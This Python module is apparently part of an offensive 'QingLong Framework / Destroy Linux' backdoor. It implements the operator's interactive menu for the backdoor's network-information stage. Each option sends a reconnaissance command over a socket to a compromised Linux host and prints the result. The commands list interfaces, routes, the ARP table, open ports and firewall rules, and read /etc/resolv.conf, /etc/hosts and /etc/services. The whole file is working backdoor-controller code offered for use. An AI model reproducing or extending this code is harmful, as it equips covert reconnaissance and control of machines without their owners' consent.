import struct
from prompt_toolkit import prompt
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.formatted_text import ANSI
from AuxiliaryFunctions import MyTable
from prompt_toolkit.history import InMemoryHistory


def NetworkRoutingandCommunication(conn):
    commands = ["back", "show functions"]
    completer = WordCompleter(commands)
    formatted_text1 = ANSI('\033[1;32;32m(QingLong Framework/Destroy Linux)-\033[0m\033[1;31;31m[BackDoor/Information ~ Network and Communication] \033[0m')
    history = InMemoryHistory()
    while True:
        choice = prompt(formatted_text1, completer=completer, history=history)
        if choice.lower() == 'show functions':
            show_functions()
            continue
        elif choice == 'back':
            break
        elif choice == "":
            continue
        elif choice == '1':
            print('\033[1;32;32m' + "[+] 查询IP信息:" + '\033[0m')
            command = "ifconfig"
            receive(conn, command)
        elif choice == '2':
            print('\033[1;32;32m' + "[+] 查询路由表:" + '\033[0m')
            command = "route"
            receive(conn, command)
        elif choice == '3':
            print('\033[1;32;32m' + "[+] 查看系统arp表:" + '\033[0m')
            command = "arp -a"
            receive(conn, command)
        elif choice == '4':
            print('\033[1;32;32m' + "[+] 查看端口的开放情况:" + '\033[0m')
            command = "netstat -antup"
            receive(conn, command)
        elif choice == '5':
            print('\033[1;32;32m' + "[+] 查看端口服务映射:" + '\033[0m')
            command = "cat /etc/services"
            receive(conn, command)
        elif choice == '6':
            print('\033[1;32;32m' + "[+] 列出iptables的配置规则:" + '\033[0m')
            command = "iptables -L"
            receive(conn, command)
        elif choice == '7':
            print('\033[1;32;32m' + "[+] 显示网卡信息:" + '\033[0m')
            command = "netstat -i"
            receive(conn, command)
        elif choice == '8':
            print('\033[1;32;32m' + "[+] 查看dns配置信息:" + '\033[0m')
            command = "cat /etc/resolv.conf"
            receive(conn, command)
            print('\033[1;32;32m' + "[+] 打印DNS系统中FQDN名称中的域名:" + '\033[0m')
            command = "dnsdomainname -V"
            receive(conn, command)
            print('\033[1;32;32m' + "[+] 查看hosts域名解析文件:" + '\033[0m')
            command = "cat /etc/hosts"
            receive(conn, command)


def receive(conn, command):
    conn.sendall(command.encode("gbk"))
    result_len = conn.recv(4)
    real_len = struct.unpack("i", result_len)[0]
    while True:
        if 1024 < real_len:
            result = conn.recv(1024).decode("gbk", errors="ignore")
            print(result)
            real_len = real_len - 1024
            continue
        else:
            result = conn.recv(1024).decode("gbk", errors="ignore")
            print(result)
            break


def show_functions():
    print("\n" + '\033[1;34;34m' + "Network and Communication" + '\033[0m' + "\n" + '=' * len("Network and Communication") + "\n")
    headers = ['\033[1;34;34m' + "id" + '\033[0m', '\033[1;34;34m' + "model", '\033[1;34;34m' + "description" + '\033[0m']
    mydata = [["1", "Query IP information", "查询IP信息"], ["2", "Query routing table", "查询路由表"], ["3", "View ARP table", "查看系统arp表"],
              ["4", "Check the opening status of the port", "查看端口的开放情况"], ["5", "View Port Service Mapping", "查看端口服务映射"],
              ["6", "List the configuration rules for iptables", "列出iptables的配置规则"], ["7", "Display network card information", "显示网卡信息"],
              ["8", "DNS信息", "DNS information"]
              ]
    MyTable.createTable(headers, mydata)
